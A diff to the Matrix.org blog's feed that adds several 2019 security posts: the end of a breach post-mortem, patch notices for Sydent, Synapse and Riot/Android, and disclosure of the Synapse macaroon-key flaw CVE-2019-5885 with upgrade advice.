+&lt;li&gt;Turning on end-to-end encryption by default, so that even if a server is compromised, the attacker cannot get at private message history.  Everyone who uses E2EE in Matrix should have felt some relief that even though the server was compromised, their message history was safe: we need to provide that to everyone.  This is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;6779&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;6779&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
+&lt;li&gt;We need device audit trails in Matrix, so that even if a compromised server (or malicious server admin) temporarily adds devices to your account, you can see what’s going on.  This is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5145&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;5145&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;We need to empower users to configure history retention in their rooms, so they can limit the amount of history exposed to an attacker. This is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1763&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1763&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;We need to provide account portability (aka decentralised accounts) so that even if a server is compromised, the users can seamlessly migrate elsewhere. The first step of this is &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1228&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-doc&#x2F;pull&#x2F;1228&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;h3 id=&quot;conclusion&quot;&gt;Conclusion&lt;&#x2F;h3&gt;
+&lt;p&gt;Hopefully this gives a comprehensive overview of what happened in the breach, how we handled it, and what we are doing to protect against this happening in future.&lt;&#x2F;p&gt;
+&lt;p&gt;Again, we’d like to apologise for the massive inconvenience this caused to everyone caught in the crossfire. Thank you for your patience and for sticking with the project whilst we restored systems. And while it is very unfortunate that we ended up in this situation, at least we should be coming out of it much stronger, at least in terms of infrastructure security.  We’d also like to particularly thank &lt;a href=&quot;https:&#x2F;&#x2F;www.linkedin.com&#x2F;in&#x2F;kade-morton-34179283&#x2F;&quot;&gt;Kade Morton&lt;&#x2F;a&gt; for providing independent review of this post and our remediations, and everyone who reached out with #hugops during the incident (it was literally the only positive thing we had on our radar), and finally thanks to the those of the Matrix team who hauled ass to rebuild the infrastructure, and also those who doubled down meanwhile to keep the rest of the project on track.&lt;&#x2F;p&gt;
+&lt;p&gt;On which note, we’re going to go back to building decentralised communication protocols and reference implementations for a bit...  Emoji reactions are on the horizon (at last!), as is Message Editing, RiotX&#x2F;Android and a host of other long-awaited features - not to mention finally releasing Synapse 1.0.  So: thanks again for flying Matrix, even during this period of extreme turbulence and, uh, hijack.  Things should mainly be back to normal now and for the foreseeable.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;i&gt;Given the new blog doesn&#x27;t have comments yet, feel free to discuss the post over at &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=19857744&quot;&gt;HN&lt;&#x2F;a&gt;.&lt;&#x2F;i&gt;&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Security updates: Sydent 1.0.3, Synapse 0.99.3.1 and Riot&#x2F;Android 0.9.0 &#x2F; 0.8.99 &#x2F; 0.8.28a</title>
+		<published>2019-05-03T00:00:00+00:00</published>
+		<updated>2019-05-03T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2019/05/03/security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28a/" type="text/html"/>
+		<id>/blog/2019/05/03/security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28a/</id>
+		<content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
+&lt;p&gt;Over the last few weeks we’ve ended up getting a lot of attention from the security research community, which has been incredibly useful and massively appreciated in terms of contributions to improve the security of the reference Matrix implementations.&lt;&#x2F;p&gt;
+&lt;p&gt;We’ve also set up an official &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&#x2F;&quot;&gt;Security Disclosure Policy&lt;&#x2F;a&gt; to explain the process of reporting security issues to us safely via responsible disclosure - including a Hall of Fame to credit those who have done so.  (Please mail &lt;a href=&quot;mailto:security@matrix.org&quot;&gt;security@matrix.org&lt;&#x2F;a&gt; to remind us if we’ve forgotten you!).&lt;&#x2F;p&gt;
+&lt;p&gt;Since we published the Hall of Fame yesterday, we’ve already been getting new entries and so we’re doing a set of security releases today to ensure they are mitigated asap.  Unfortunately the work around this means that we’re running late in publishing the post mortem of the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;04&#x2F;11&#x2F;security-incident&quot;&gt;Apr 11 security incident&lt;&#x2F;a&gt; - we are trying to get that out as soon as we can.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;sydent-1-0-3&quot;&gt;Sydent 1.0.3&lt;&#x2F;h2&gt;
+&lt;p&gt;Sydent 1.0.3 has three security fixes:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ensure that authentication tokens are generated using a secure random number generator, ensuring they cannot be predicted by an attacker.  This is an important fix - please update.  Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing the issue!&lt;&#x2F;li&gt;
+&lt;li&gt;Mitigate an HTML injection bug where an invalid room_id could result in malicious HTML being injected into validation emails.  &lt;strong&gt;The fix for this is in the email template itself; you will need to update any customised email templates to be protected.&lt;&#x2F;strong&gt;  Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing this issue too!&lt;&#x2F;li&gt;
+&lt;li&gt;Randomise session_ids to avoid leaking info about the total number of identity validations, and whether a given ID has been validated.  Thanks to &lt;a href=&quot;https:&#x2F;&#x2F;fs0c131y.com&quot;&gt;@fs0c131y&lt;&#x2F;a&gt; for identifying and responsibly disclosing this one.&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;If you are running Sydent as an identity server, you should update as soon as possible from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&#x2F;releases&#x2F;v1.0.3&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;sydent&#x2F;releases&#x2F;v1.0.3&lt;&#x2F;a&gt;.  We are not aware of any of these issues having been exploited maliciously in the wild.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;synapse-0-99-3-1&quot;&gt;Synapse 0.99.3.1&lt;&#x2F;h2&gt;
+&lt;p&gt;Synapse 0.99.3.1 is a security update for two fixes:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ensure that random IDs in Synapse are generated using a secure random number generator, ensuring they cannot be predicted by an attacker. Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing this issue!&lt;&#x2F;li&gt;
+&lt;li&gt;Add 0.0.0.0&#x2F;32 and ::&#x2F;128 to the URL preview blacklist configuration, ensuring that an attacker cannot make connections to localhost. Thanks to Enguerran Gillier (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@opnsec&quot;&gt;@opnsec&lt;&#x2F;a&gt;) for identifying and responsibly disclosing this issue too!&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;You can update from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&lt;&#x2F;a&gt; or similar as normal. We are not aware of any of these issues having been exploited maliciously in the wild.&lt;&#x2F;p&gt;
+&lt;p&gt;(Synapse 0.99.3.2 was released shortly afterwards to fix a non-security issue with the Debian packaging)&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;riot-android-0-9-x-0-8-99-google-play-and-0-8-28a-f-droid&quot;&gt;Riot&#x2F;Android 0.9.x&#x2F;0.8.99 (Google Play) and 0.8.28a (F-Droid)&lt;&#x2F;h2&gt;
+&lt;p&gt;Riot&#x2F;Android has an important security fix which shipped over the course of the last week in various versions of the app:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Remove obsolete and buggy ContentProvider which could allow a malicious local app to compromise account data. Many thanks to Julien Thomas (&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;@julien_thomas&quot;&gt;@julien_thomas&lt;&#x2F;a&gt;) from &lt;a href=&quot;https:&#x2F;&#x2F;protektoid.com&quot;&gt;Protektoid Project&lt;&#x2F;a&gt; for identifying this and responsibly disclosing it!&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;The fix for this shipped on F-Droid since 0.8.28a, and on the Play Store, the fix is present in both v0.9.0 (the first version of the re-published Riot app) and v0.8.99 (the last version of the old Riot app, which told everyone to reinstall).  Other forks of Riot which we’re aware of have also been informed and should be updated.&lt;&#x2F;p&gt;
+&lt;p&gt;If you haven’t already updated, please do so now.&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Further details on Critical Security Update in Synapse affecting all versions prior to 0.34.1 (CVE-2019-5885)</title>
+		<published>2019-01-15T00:00:00+00:00</published>
+		<updated>2019-01-15T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2019/01/15/further-details-on-critical-security-update-in-synapse-affecting-all-versions-prior-to-0-34-1-cve-2019-5885/" type="text/html"/>
+		<id>/blog/2019/01/15/further-details-on-critical-security-update-in-synapse-affecting-all-versions-prior-to-0-34-1-cve-2019-5885/</id>
+		<content type="html">&lt;p&gt;On &lt;a href=&quot;&#x2F;blog&#x2F;2019&#x2F;01&#x2F;10&#x2F;critical-security-update-synapse-0-34-0-1-synapse-0-34-1-1&#x2F;&quot;&gt;Thursday Jan 10th we released a Critical Security Update (Synapse 0.34.0.1&#x2F;0.34.1.1)&lt;&#x2F;a&gt;, which fixes a serious security bug in Synapse 0.34.0 and earlier. Many deployments have now upgraded to 0.34.0.1 or 0.34.1.1, and we now consider it appropriate to disclose more information about the issue, to provide context and &lt;b&gt;encourage the remaining affected servers to upgrade as soon as possible&lt;&#x2F;b&gt;.&lt;&#x2F;p&gt;
+&lt;p&gt;In Synapse 0.11 (Nov 2015) we added a configuration parameter called “macaroon_secret_key” which relates to our use of &lt;a href=&quot;https:&#x2F;&#x2F;ai.google&#x2F;research&#x2F;pubs&#x2F;pub41892&quot;&gt;macaroons&lt;&#x2F;a&gt; in authentication. Macaroons are authentication tokens which must be signed by the server which generates them, to prevent them being forged by attackers. “macaroon_secret_key” defines the key which is used for this signature, and it must therefore be kept secret to preserve the security of the server.&lt;&#x2F;p&gt;
+&lt;p&gt;If the option is not set, Synapse will attempt to derive a secret key from other secrets specified in the configuration file. However, in all versions of Synapse up to and including 0.34.0, this process was faulty and a predictable value was used instead.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;b&gt;So if, your homeserver.yaml does not contain a macaroon_secret_key, you need to upgrade to 0.34.1.1 or 0.34.0.1 or Debian 0.34.0-3~bpo9+2 immediately to prevent the risk of account hijacking.&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The vulnerability affects any Synapse installation which does not have a macaroon_secret_key setting. &lt;b&gt;For example, the Debian and Ubuntu packages from Matrix.org, Debian and Ubuntu include a configuration file without an explicit macaroon_secret_key and must upgrade. &lt;&#x2F;b&gt;Anyone who hasn&#x27;t updated their config since Nov 2015 or who grandfathered their config from the Debian&#x2F;Ubuntu packages will likely also be affected.&lt;&#x2F;p&gt;
+&lt;p&gt;We are not aware of this vulnerability being exploited in the wild, but if you are running an affected server it may still be wise to check your synapse&#x27;s user_ips database table for any unexpected access to your server&#x27;s accounts. You could also check your accounts&#x27; device lists (shown under Settings in Riot) for unexpected devices, although this is not as reliable as an attacker could cover their tracks to remove unexpected devices.&lt;&#x2F;p&gt;
+&lt;p&gt;We&#x27;ll publish a full post-mortem of the issue once we are confident that most affected servers have been upgraded.&lt;&#x2F;p&gt;
+&lt;p&gt;We&#x27;d like to apologise for the inconvenience caused by this - especially to folks who upgraded since Friday who were in practice not affected. Due to the nature of the issue we wanted to minimise details about the issue until people had a chance to upgrade. We also did not follow a planned disclosure procedure because Synapse 0.34.1 already unintentionally disclosed the existence of the bug by fixing it (causing the logout bug for affected users which led us to pull the original Synapse 0.34.1 release).&lt;&#x2F;p&gt;
+&lt;p&gt;On the plus side, we are approaching the end of beta for Synapse, and going forwards hope to see much better stability and security across the board.&lt;&#x2F;p&gt;
+&lt;p&gt;Thanks again for your patience,&lt;&#x2F;p&gt;
+&lt;p&gt;The Matrix.org Team&lt;&#x2F;p&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
+		<title>Critical Security Update: Synapse 0.34.0.1&#x2F;Synapse 0.34.1.1</title>
+		<published>2019-01-10T00:00:00+00:00</published>
+		<updated>2019-01-10T00:00:00+00:00</updated>
+		<link rel="alternate" href="/blog/2019/01/10/critical-security-update-synapse-0-34-0-1-synapse-0-34-1-1/" type="text/html"/>
+		<id>/blog/2019/01/10/critical-security-update-synapse-0-34-0-1-synapse-0-34-1-1/</id>
+		<content type="html">&lt;p&gt;After releasing Synapse v0.34.1, we have become aware of a security vulnerability affecting all previous versions (&lt;a href=&quot;http:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2019-5885&quot;&gt;CVE-2019-5885&lt;&#x2F;a&gt;). v0.34.1 closed the vulnerability but, in some cases, caused users to be logged out of their clients, so we do not recommend v0.34.1 for production use.&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;b&gt;Today we release two mitigating versions v0.34.0.1 and v0.34.1.1&lt;&#x2F;b&gt;. Both versions close the vulnerability and will not cause users to be logged out. &lt;b&gt;All installations should be upgraded to one or other immediately.&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
+&lt;ul&gt;
+ 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Admins who would otherwise upgrade to v0.34.1 (or those that have already done so) should upgrade to v0.34.1.1. 
+&lt;&#x2F;li&gt;
+ 	&lt;li style=&quot;font-weight: 400;&quot;&gt;Admins on v0.34.0, who do not wish to bring in new non-security related behaviour, should upgrade to v0.34.0.1.
+&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;You can get the new updates for &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.34.0.1&quot;&gt;v0.34.0.1&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.34.1.1&quot;&gt;v0.34.1.1&lt;&#x2F;a&gt; here or any of the sources mentioned at &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&lt;&#x2F;a&gt;. Note, Synapse is now available from PyPI, pick it up &lt;a href=&quot;https:&#x2F;&#x2F;pypi.org&#x2F;project&#x2F;matrix-synapse&#x2F;&quot;&gt;here&lt;&#x2F;a&gt;. See also our &lt;a href=&quot;&#x2F;docs&#x2F;guides&#x2F;installing-synapse&quot;&gt;Synapse installation guide page.&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We will publish more details of the vulnerability once admins have had a chance to upgrade. To our knowledge the vulnerability has not been exploited in the wild.&lt;&#x2F;p&gt;
+&lt;p&gt;Many thanks for your patience, we are moving ever closer to Synapse reaching v1.0, and fixes like this one edge us ever closer.&lt;&#x2F;p&gt;
+&lt;p&gt;Thanks also to the package maintainers who have coordinated with us to ensure distro packages are available for a speedy upgrade!&lt;&#x2F;p&gt;
+&lt;ul&gt;
+ 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.34.0.1&quot;&gt;Synapse v0.34.0.1 Changelog&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+ 	&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v0.34.1.1&quot;&gt;Synapse v0.34.1.1 Changelog&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+	</entry>
+	<entry xml:lang="en">
 		<title>Critical Security Update: Synapse 0.33.3.1</title>
 		<published>2018-09-06T00:00:00+00:00</published>
 		<updated>2018-09-06T00:00:00+00:00</updated>
